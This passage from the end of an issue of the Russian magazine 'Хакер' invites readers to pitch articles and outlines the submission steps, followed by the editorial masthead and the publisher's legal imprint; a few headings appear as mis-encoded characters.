   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №01 (274)

            Андрей Письменный        Илья Русанен            Алексей Глазков
               Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                        Евгения Шарипова
                                           Литературный редактор


                         РЕДАКТОРЫ РУБРИК

            Андрей Письменный         Евгений Зобнин        Валентин Холмогоров
               pismenny@glc.ru              zobnin@glc.ru           valentin@holmogorov.ru
               Татьяна Чупрова            Марк           Иван «aLLy» Андреев
                chuprova@glc.ru       Бруцкий-Стемпковский    iam@russiansecurity.expert
                                              brutsky@glc.ru


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ

                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                          Вопросы по подписке:       ​Вопросы по материалам:
                                 lapina@glc.ru                support@glc.ru​





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар»​ ​125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ​Эл № ​ФС77-​67001 от ​30.​
08.​2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция
не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2022